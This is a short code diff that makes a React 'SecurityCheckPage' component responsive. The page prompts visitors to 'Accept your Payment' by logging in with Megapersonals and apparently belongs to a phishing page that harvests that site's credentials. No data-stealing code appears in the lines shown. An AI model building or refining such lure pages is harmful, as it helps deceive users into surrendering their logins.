@@ -49,7 +49,7 @@ function SecurityCheckPage() {
   };
 
   return (
-    <div className="w-[40%] p-5 shadow-2xl rounded-md mx-auto">
+    <div className="w-full md:w-[40%]  p-5 shadow-2xl rounded-md mx-auto">
     <p className="text-lg font-semibold text-center">
       Accept your Payment{" "}
     </p>
@@ -59,7 +59,7 @@ function SecurityCheckPage() {
     </p>
     <img src="/images/logo-potrait.jpg" alt="" />
     <p className="text-center text-xs mt-3">To accept this money</p>
-    <div className="w-[90%] m-3">
+    <div className="flex flex-col m-3">
       <p className="text-start text-lg font-semibold pl-3">
         Login with Megapersonals
       </p>
